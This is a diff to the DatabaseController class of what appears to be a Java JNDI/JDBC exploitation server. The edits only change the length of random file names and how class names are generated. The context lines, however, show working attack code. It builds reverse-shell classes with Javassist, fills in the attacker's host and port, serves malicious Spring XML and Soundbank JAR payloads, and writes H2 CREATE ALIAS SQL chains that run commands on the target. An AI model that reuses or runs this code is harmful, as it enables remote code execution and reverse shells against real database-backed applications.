@@ -77,7 +77,7 @@ public abstract class DatabaseController implements Controller {
     public Properties postgresqlCommand(String cmd) {
         System.out.println("[PostgreSQL] Cmd: " + cmd);
 
-        String fileName = MiscUtil.getRandStr(12) + ".xml";
+        String fileName = MiscUtil.getRandStr(8) + ".xml";
         String fileContent = SpringXmlPayload.command(cmd);
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
@@ -96,7 +96,7 @@ public abstract class DatabaseController implements Controller {
     public Properties postgresqlReverseShell(String host, String port) throws Exception {
         System.out.println("[PostgreSQL] [ReverseShell] Host: " + host + " Port: " + port);
 
-        String className = MiscUtil.getRandStr(12);
+        String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(ReverseShell.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
@@ -105,7 +105,7 @@ public abstract class DatabaseController implements Controller {
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
         byte[] byteCode = clazz.toBytecode();
 
-        String fileName = MiscUtil.getRandStr(12) + ".xml";
+        String fileName = MiscUtil.getRandStr(8) + ".xml";
         String fileContent = SpringXmlPayload.loadClass(className, byteCode);
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
@@ -211,8 +211,8 @@ public abstract class DatabaseController implements Controller {
     public Properties h2JRESoundbankCommand(String cmd) throws Exception {
         System.out.println("[H2-JRE] [Command] Cmd: " + cmd);
 
-        String jarName = MiscUtil.getRandStr(12) + ".jar";
-        String className = MiscUtil.getRandStr(12);
+        String jarName = MiscUtil.getRandStr(8) + ".jar";
+        String className = MiscUtil.getClassName();
 
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(Command.class.getName());
@@ -224,7 +224,7 @@ public abstract class DatabaseController implements Controller {
         byte[] jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
         WebServer.getInstance().serveFile("/" + jarName, jarBytes);
 
-        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlFileName = MiscUtil.getRandStr(8) + ".sql";
         String sqlContent = "CREATE ALIAS NEW_INSTANCE FOR 'org.h2.util.Utils.newInstance(java.lang.String, java.lang.Object[])';\n" +
                 "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
                 "CREATE ALIAS SET_PROPERTY FOR 'java.lang.System.setProperty(java.lang.String, java.lang.String)';\n" +
@@ -251,8 +251,8 @@ public abstract class DatabaseController implements Controller {
     public Properties h2JRESoundbankReverseShell(String host, String port) throws Exception {
         System.out.println("[H2-JRE] [ReverseShell] Host: " + host + " Port: " + port);
 
-        String jarName = MiscUtil.getRandStr(12) + ".jar";
-        String className = MiscUtil.getRandStr(12);
+        String jarName = MiscUtil.getRandStr(8) + ".jar";
+        String className = MiscUtil.getClassName();
 
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(ReverseShell.class.getName());
@@ -265,7 +265,7 @@ public abstract class DatabaseController implements Controller {
         byte[] jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
         WebServer.getInstance().serveFile("/" + jarName, jarBytes);
 
-        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlFileName = MiscUtil.getRandStr(8) + ".sql";
         String sqlContent = "CREATE ALIAS NEW_INSTANCE FOR 'org.h2.util.Utils.newInstance(java.lang.String, java.lang.Object[])';\n" +
                 "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
                 "CREATE ALIAS SET_PROPERTY FOR 'java.lang.System.setProperty(java.lang.String, java.lang.String)';\n" +
@@ -292,11 +292,11 @@ public abstract class DatabaseController implements Controller {
     public Properties h2JRESpringCommand(String cmd) {
         System.out.println("[H2-JRE] [Spring] [Command] Cmd: " + cmd);
 
-        String xmlFileName = MiscUtil.getRandStr(12) + ".xml";
+        String xmlFileName = MiscUtil.getRandStr(8) + ".xml";
         String xmlContent = SpringXmlPayload.command(cmd);
         WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
 
-        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlFileName = MiscUtil.getRandStr(8) + ".sql";
         String sqlContent = "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';\n" +
                 "CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';\n" +
                 "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
@@ -323,7 +323,7 @@ public abstract class DatabaseController implements Controller {
     public Properties h2JRESpringReverseShell(String host, String port) throws Exception {
         System.out.println("[H2-JRE] [Spring] [ReverseShell] Host: " + host + " Port: " + port);
 
-        String className = MiscUtil.getRandStr(12);
+        String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(ReverseShell.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
@@ -332,11 +332,11 @@ public abstract class DatabaseController implements Controller {
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
         byte[] byteCode = clazz.toBytecode();
 
-        String xmlFileName = MiscUtil.getRandStr(12) + ".xml";
+        String xmlFileName = MiscUtil.getRandStr(8) + ".xml";
         String xmlContent = SpringXmlPayload.loadClass(className, byteCode);
         WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
 
-        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlFileName = MiscUtil.getRandStr(8) + ".sql";
         String sqlContent = "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';\n" +
                 "CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';\n" +
                 "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
@@ -404,7 +404,7 @@ public abstract class DatabaseController implements Controller {
 
         String url = "jdbc:derby:memory:" + database + ";create=true";
 
-        String className = MiscUtil.getRandStr(12);
+        String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(DerbyTool.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
